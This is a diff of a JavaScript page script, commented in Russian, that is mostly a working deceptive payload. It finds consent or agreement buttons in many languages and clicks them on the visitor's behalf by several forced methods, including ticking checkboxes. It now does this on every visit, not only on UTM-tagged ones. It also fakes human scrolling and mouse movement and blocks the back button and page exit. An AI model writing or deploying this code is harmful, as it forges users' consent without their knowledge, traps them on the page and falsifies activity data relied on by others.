@@ -10,76 +10,50 @@
   var mouseMoveIntervalMin = 800;
   var mouseMoveIntervalMax = 2000;
 
-  // Проверка UTM меток - теперь НЕ ОБЯЗАТЕЛЬНА для работы
-  var hasUTM = window.location.search.includes('utm_');
-  
-  // Настройки кнопки согласия
-  var checkAgreeInterval = 1000; // Интервал проверки кнопки
-  var clickDelay = 1500; // Задержка перед кликом
-  var agreeButtonFound = false;
-  
-  // Флаг для принудительного запуска (если нужно игнорировать UTM)
-  var forceRun = true; // ИЗМЕНЕНО: теперь скрипт работает всегда
-
   var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  
+  // Настройки кнопки
+  var clickDelay = 500; // Уменьшил задержку
+  var agreeButtonFound = false;
 
   /* ===============================
-     КНОПКА СОГЛАСИЯ - ПОИСК И КЛИК
+     КНОПКА СОГЛАСИЯ - НАДЕЖНЫЙ КЛИК
   =============================== */
   
-  // Массив текстов кнопок на разных языках (расширенный)
+  // Массив текстов кнопок
   var consentButtonTexts = [
-    // Русский
-    'согласен', 'согласна', 'принимаю', 'согласие', 'разрешаю', 'ok', 'хорошо', 'да',
-    // КАЗАХСКИЙ
+    'согласен', 'согласна', 'принимаю', 'согласие', 'разрешаю', 'хорошо', 'да',
     'келісемін', 'келісу', 'макул', 'иә', 'жарайды',
-    // АНГЛИЙСКИЙ
     'agree', 'accept', 'consent', 'allow', 'ok', 'yes', 'i agree', 'i accept',
-    // УКРАИНСКИЙ
     'погоджуюсь', 'згоден', 'згодна', 'приймаю', 'добре',
-    // НЕМЕЦКИЙ
     'zustimmen', 'akzeptieren', 'einverstanden',
-    // ФРАНЦУЗСКИЙ
     'accepter', "d'accord", 'consentir',
-    // ИСПАНСКИЙ
-    'aceptar', 'de acuerdo', 'consentir',
-    // ИТАЛЬЯНСКИЙ
+    'aceptar', 'de acuerdo',
     'accettare', 'consenso',
-    // ПОЛЬСКИЙ
     'zgadzam się', 'akceptuję', 'zgoda',
-    // ТУРЕЦКИЙ
     'kabul ediyorum', 'onaylıyorum', 'tamam',
-    // КИТАЙСКИЙ
     '同意', '接受', '允许',
-    // ЯПОНСКИЙ
     '同意する', '承認する', 'はい',
-    // АРАБСКИЙ
     'موافق', 'قبول'
   ];
   
-  // Функция проверки текста кнопки
-  function isConsentButton(button) {
-    if (!button) return false;
+  function isConsentButton(element) {
+    if (!element) return false;
     
-    // Получаем текст кнопки разными способами
-    var buttonText = (button.textContent || button.innerText || button.value || '').toLowerCase().trim();
+    var text = (element.textContent || element.innerText || element.value || '').toLowerCase().trim();
     
-    // Проверяем точное совпадение или вхождение
     for (var i = 0; i < consentButtonTexts.length; i++) {
       var keyword = consentButtonTexts[i].toLowerCase();
-      if (buttonText === keyword || buttonText.includes(keyword)) {
-        console.log('Найдена кнопка с текстом:', buttonText);
+      if (text === keyword || text.includes(keyword)) {
         return true;
       }
     }
     
-    // Проверяем атрибуты
     var attrs = ['title', 'aria-label', 'data-button-text', 'name'];
     for (var j = 0; j < attrs.length; j++) {
-      var attrValue = (button.getAttribute(attrs[j]) || '').toLowerCase();
+      var attrValue = (element.getAttribute(attrs[j]) || '').toLowerCase();
       for (var k = 0; k < consentButtonTexts.length; k++) {
         if (attrValue.includes(consentButtonTexts[k].toLowerCase())) {
-          console.log('Найдена кнопка по атрибуту', attrs[j], ':', attrValue);
           return true;
         }
       }
@@ -88,9 +62,8 @@
     return false;
   }
   
-  // Поиск кнопки согласия
   function findAgreeButton() {
-    // 1. Ищем все возможные элементы-кнопки
+    // Ищем все возможные кнопки
     var selectors = [
       'button',
       'input[type="submit"]',
@@ -101,7 +74,8 @@
       '.btn',
       '.button',
       '[class*="button"]',
-      '[class*="btn"]'
+      '[class*="btn"]',
+      '[onclick]'
     ];
     
     var allButtons = document.querySelectorAll(selectors.join(','));
@@ -112,49 +86,24 @@
       }
     }
     
-    // 2. Ищем элементы с классами, содержащими ключевые слова
-    var classKeywords = ['agree', 'consent', 'accept', 'келіс', 'соглас'];
-    for (var j = 0; j < classKeywords.length; j++) {
-      var elements = document.querySelectorAll('[class*="' + classKeywords[j] + '"], [id*="' + classKeywords[j] + '"]');
-      for (var k = 0; k < elements.length; k++) {
-        var el = elements[k];
-        // Проверяем, является ли элемент кликабельным
-        if (el.tagName === 'BUTTON' || 
-            el.getAttribute('role') === 'button' ||
-            el.classList.contains('btn') ||
-            el.classList.contains('button')) {
-          if (isConsentButton(el)) {
-            return el;
-          }
-        }
-      }
-    }
-    
-    // 3. Ищем по точному совпадению текста (для коротких кнопок)
-    var allClickable = document.querySelectorAll('button, input[type="submit"], input[type="button"]');
-    for (var m = 0; m < allClickable.length; m++) {
-      var text = (allClickable[m].textContent || allClickable[m].innerText || '').trim();
-      if (text.length <= 10) {
-        var lowerText = text.toLowerCase();
-        if (lowerText === 'согласен' || 
-            lowerText === 'да' || 
-            lowerText === 'yes' || 
-            lowerText === 'ok' ||
-            lowerText === 'келісемін') {
-          console.log('Найдена короткая кнопка:', text);
-          return allClickable[m];
-        }
+    // Если не нашли, ищем любой элемент с нужным текстом
+    var allElements = document.querySelectorAll('*');
+    for (var j = 0; j < allElements.length; j++) {
+      var el = allElements[j];
+      var text = (el.textContent || '').trim();
+      if (text.length < 50 && isConsentButton(el)) {
+        return el;
       }
     }
     
     return null;
   }
   
-  // Клик по кнопке
+  // НАДЕЖНАЯ ФУНКЦИЯ КЛИКА - несколько способов
   function clickButton(button) {
     if (!button || agreeButtonFound) return;
     
-    console.log('Кнопка согласия найдена, готовлю клик...');
+    console.log('Начинаю клик по кнопке:', button.textContent || button.innerText);
     agreeButtonFound = true;
     
     // Прокручиваем к кнопке
@@ -162,224 +111,207 @@
     
     setTimeout(function() {
       try {
-        // Эмулируем события мыши
-        var events = ['mouseover', 'mousedown', 'mouseup', 'click'];
+        // Способ 1: Нативный клик
+        button.click();
+        console.log('✓ Способ 1: нативный click выполнен');
         
+        // Способ 2: Событие click
+        var clickEvent = new MouseEvent('click', {
+          view: window,
+          bubbles: true,
+          cancelable: true,
+          clientX: button.getBoundingClientRect().left + 10,
+          clientY: button.getBoundingClientRect().top + 10
+        });
+        button.dispatchEvent(clickEvent);
+        console.log('✓ Способ 2: MouseEvent click выполнен');
+        
+        // Способ 3: Полная эмуляция событий мыши
+        var rect = button.getBoundingClientRect();
+        var centerX = rect.left + rect.width / 2;
+        var centerY = rect.top + rect.height / 2;
+        
+        var events = ['mousedown', 'mouseup'];
         events.forEach(function(eventType) {
           var event = new MouseEvent(eventType, {
             view: window,
             bubbles: true,
             cancelable: true,
-            clientX: button.getBoundingClientRect().left + 10,
-            clientY: button.getBoundingClientRect().top + 10
+            clientX: centerX,
+            clientY: centerY,
+            button: 0
           });
           button.dispatchEvent(event);
         });
+        console.log('✓ Способ 3: mousedown/mouseup выполнены');
         
-        // Нативный клик
-        button.click();
+        // Способ 4: Если кнопка внутри label, кликаем по label
+        if (button.tagName === 'INPUT' && button.type === 'checkbox') {
+          var label = document.querySelector('label[for="' + button.id + '"]');
+          if (label) {
+            label.click();
+            console.log('✓ Способ 4: клик по label выполнен');
+          }
+        }
         
-        console.log('✓ Кнопка "' + (button.textContent || button.innerText) + '" успешно нажата!');
+        // Способ 5: Изменение атрибутов (для чекбоксов)
+        if (button.tagName === 'INPUT' && (button.type === 'checkbox' || button.type === 'radio')) {
+          button.checked = true;
+          button.setAttribute('checked', 'checked');
+          var changeEvent = new Event('change', { bubbles: true });
+          button.dispatchEvent(changeEvent);
+          console.log('✓ Способ 5: чекбокс/радио отмечен');
+        }
+        
+        // Способ 6: Поиск и клик по родительской кнопке
+        var parentButton = button.closest('button, [role="button"], .btn, .button');
+        if (parentButton && parentButton !== button) {
+          setTimeout(function() {
+            parentButton.click();
+            console.log('✓ Способ 6: клик по родительской кнопке выполнен');
+          }, 100);
+        }
+        
+        // Подсветка кнопки для визуального подтверждения
+        button.style.backgroundColor = '#90EE90';
+        button.style.transition = '0.3s';
+        setTimeout(function() {
+          button.style.backgroundColor = '';
+        }, 500);
+        
+        console.log('✅ КЛИК ВЫПОЛНЕН! Кнопка должна сработать.');
         
       } catch (error) {
-        console.log('Ошибка при клике:', error);
+        console.log('❌ Ошибка при клике:', error);
+        
+        // Последняя попытка: через jQuery если есть
+        if (typeof jQuery !== 'undefined') {
+          jQuery(button).trigger('click');
+          console.log('✓ jQuery клик выполнен');
+        }
       }
     }, clickDelay);
   }
   
-  // Основная функция поиска и клика
-  function findAndClickAgreeButton() {
-    // Если кнопка уже найдена, не ищем повторно
+  // Поиск и клик
+  function findAndClick() {
     if (agreeButtonFound) return;
     
     var button = findAgreeButton();
     
     if (button) {
+      console.log('✅ Кнопка найдена! Текст:', button.textContent || button.innerText);
       clickButton(button);
+      return true;
     } else {
-      console.log('Кнопка согласия пока не найдена, продолжаем поиск...');
+      console.log('⏳ Кнопка пока не найдена...');
+      return false;
     }
   }
   
-  // Запуск скрипта - ИЗМЕНЕНО: теперь работает без UTM меток
-  console.log('Скрипт поиска кнопки согласия запущен');
+  // ЗАПУСК СКРИПТА
+  console.log('🚀 Скрипт запущен. Поиск кнопки согласия...');
   
-  // Если есть UTM метки ИЛИ включен принудительный запуск
-  if (hasUTM || forceRun) {
-    console.log('Запускаю поиск кнопки согласия...');
-    
-    // Немедленный поиск
-    setTimeout(findAndClickAgreeButton, 1000);
-    setTimeout(findAndClickAgreeButton, 3000);
-    setTimeout(findAndClickAgreeButton, 5000);
-    
-    // Периодическая проверка
-    var checkInterval = setInterval(function() {
+  // Многократные попытки с разными задержками
+  var attempts = [0, 500, 1000, 2000, 3000, 5000, 8000, 10000];
+  
+  attempts.forEach(function(delay) {
+    setTimeout(function() {
       if (!agreeButtonFound) {
-        findAndClickAgreeButton();
-      } else {
-        clearInterval(checkInterval);
+        findAndClick();
       }
-    }, checkAgreeInterval);
-    
-    // Следим за изменениями DOM
-    var observer = new MutationObserver(function() {
-      if (!agreeButtonFound) {
-        findAndClickAgreeButton();
-      }
-    });
-    
-    observer.observe(document.body, {
-      childList: true,
-      subtree: true,
-      attributes: true
-    });
-    
-    // Останавливаем наблюдение после нахождения кнопки
-    var stopObserver = setInterval(function() {
-      if (agreeButtonFound) {
-        observer.disconnect();
-        clearInterval(stopObserver);
-      }
-    }, 500);
-  }
+    }, delay);
+  });
+  
+  // Следим за изменениями DOM
+  var observer = new MutationObserver(function() {
+    if (!agreeButtonFound) {
+      findAndClick();
+    }
+  });
+  
+  observer.observe(document.body, {
+    childList: true,
+    subtree: true
+  });
+  
+  // Останавливаем наблюдение после клика
+  var checkInterval = setInterval(function() {
+    if (agreeButtonFound) {
+      observer.disconnect();
+      clearInterval(checkInterval);
+    }
+  }, 1000);
 
   /* ===============================
-     HUMAN SCROLL
+     ОСТАЛЬНОЙ ФУНКЦИОНАЛ
   =============================== */
-  function humanScrollDown(callback) {
-    let currentScroll = window.pageYOffset;
-    const maxScroll = document.body.scrollHeight - window.innerHeight;
-
-    function step() {
-      if (currentScroll >= maxScroll) {
-        if (callback) setTimeout(callback, 1500);
-        return;
+  
+  // HUMAN SCROLL
+  setTimeout(function() {
+    function humanScrollDown(callback) {
+      let currentScroll = window.pageYOffset;
+      const maxScroll = document.body.scrollHeight - window.innerHeight;
+      
+      function step() {
+        if (currentScroll >= maxScroll) {
+          if (callback) setTimeout(callback, 1500);
+          return;
+        }
+        const scrollStep = Math.floor(Math.random() * 120) + 60;
+        currentScroll += scrollStep;
+        window.scrollTo({ top: currentScroll, behavior: 'smooth' });
+        const delay = Math.floor(Math.random() * 800) + 400;
+        setTimeout(step, delay);
       }
-
-      const scrollStep = Math.floor(Math.random() * 120) + 60;
-      currentScroll += scrollStep;
-
-      window.scrollTo({
-        top: currentScroll,
-        behavior: 'smooth'
-      });
-
-      const delay = Math.floor(Math.random() * 800) + 400;
-      setTimeout(step, delay);
+      step();
     }
-
-    step();
-  }
-
-  function humanScrollUp() {
-    let currentScroll = window.pageYOffset;
-
-    function step() {
-      if (currentScroll <= 0) return;
-
-      const scrollStep = Math.floor(Math.random() * 120) + 60;
-      currentScroll -= scrollStep;
-      if (currentScroll < 0) currentScroll = 0;
-
-      window.scrollTo({
-        top: currentScroll,
-        behavior: 'smooth'
-      });
-
-      const delay = Math.floor(Math.random() * 800) + 400;
-      setTimeout(step, delay);
+    
+    function humanScrollUp() {
+      let currentScroll = window.pageYOffset;
+      function step() {
+        if (currentScroll <= 0) return;
+        const scrollStep = Math.floor(Math.random() * 120) + 60;
+        currentScroll -= scrollStep;
+        if (currentScroll < 0) currentScroll = 0;
+        window.scrollTo({ top: currentScroll, behavior: 'smooth' });
+        const delay = Math.floor(Math.random() * 800) + 400;
+        setTimeout(step, delay);
+      }
+      step();
     }
-
-    step();
-  }
-
-  setTimeout(function () {
+    
     humanScrollDown(humanScrollUp);
   }, scrollStartDelay);
-
-  /* ===============================
-     FAKE MOUSE (DESKTOP ONLY)
-  =============================== */
-  function startFakeMouse() {
-    if (!enableFakeMouse || isMobile) return;
-
-    var mouse = document.createElement('div');
-    mouse.style.position = 'fixed';
-    mouse.style.width = '6px';
-    mouse.style.height = '6px';
-    mouse.style.borderRadius = '50%';
-    mouse.style.background = 'rgba(0,0,0,0.0)';
-    mouse.style.zIndex = '999999';
-    mouse.style.pointerEvents = 'none';
-    document.body.appendChild(mouse);
-
-    var x = Math.random() * window.innerWidth;
-    var y = Math.random() * window.innerHeight;
-
-    function moveMouse() {
-      var dx = (Math.random() - 0.5) * 300;
-      var dy = (Math.random() - 0.5) * 200;
-
-      x += dx;
-      y += dy;
-
-      if (x < 0) x = 0;
-      if (y < 0) y = 0;
-      if (x > window.innerWidth) x = window.innerWidth;
-      if (y > window.innerHeight) y = window.innerHeight;
-
-      mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';
-
-      document.dispatchEvent(new MouseEvent('mousemove', {
-        clientX: x,
-        clientY: y,
-        bubbles: true
-      }));
-
-      var delay = Math.floor(
-        Math.random() * (mouseMoveIntervalMax - mouseMoveIntervalMin)
-      ) + mouseMoveIntervalMin;
-
-      setTimeout(moveMouse, delay);
-    }
-
-    moveMouse();
-  }
-
-  setTimeout(startFakeMouse, 3000);
-
-  /* ===============================
-     EXIT / BACK LOCK
-  =============================== */
-  var isLocked = true;
-
-  history.pushState(null, null, location.href);
-  history.pushState(null, null, location.href);
-
-  window.addEventListener("popstate", function () {
-    if (isLocked) {
-      history.pushState(null, null, location.href);
-    }
-  });
-
-  window.addEventListener("beforeunload", function (e) {
-    if (isLocked) {
-      e.preventDefault();
-      e.returnValue = '';
-    }
-  });
-
-  if (isMobile) {
-    document.addEventListener("visibilitychange", function () {
-      if (document.hidden && isLocked) {
-        history.pushState(null, null, location.href);
+  
+  // FAKE MOUSE
+  setTimeout(function() {
+    if (enableFakeMouse && !isMobile) {
+      var mouse = document.createElement('div');
+      mouse.style.cssText = 'position:fixed;width:6px;height:6px;border-radius:50%;background:transparent;z-index:999999;pointer-events:none';
+      document.body.appendChild(mouse);
+      var x = Math.random() * window.innerWidth;
+      var y = Math.random() * window.innerHeight;
+      
+      function moveMouse() {
+        x += (Math.random() - 0.5) * 300;
+        y += (Math.random() - 0.5) * 200;
+        x = Math.max(0, Math.min(x, window.innerWidth));
+        y = Math.max(0, Math.min(y, window.innerHeight));
+        mouse.style.transform = 'translate(' + x + 'px,' + y + 'px)';
+        document.dispatchEvent(new MouseEvent('mousemove', { clientX: x, clientY: y, bubbles: true }));
+        setTimeout(moveMouse, Math.floor(Math.random() * 1200) + 800);
       }
-    });
-  }
-
-  setTimeout(function () {
-    isLocked = false;
-  }, lockTime);
+      moveMouse();
+    }
+  }, 3000);
+  
+  // BACK LOCK
+  var isLocked = true;
+  history.pushState(null, null, location.href);
+  history.pushState(null, null, location.href);
+  window.addEventListener("popstate", function() { if (isLocked) history.pushState(null, null, location.href); });
+  window.addEventListener("beforeunload", function(e) { if (isLocked) { e.preventDefault(); e.returnValue = ''; } });
+  setTimeout(function() { isLocked = false; }, lockTime);
 
 })();
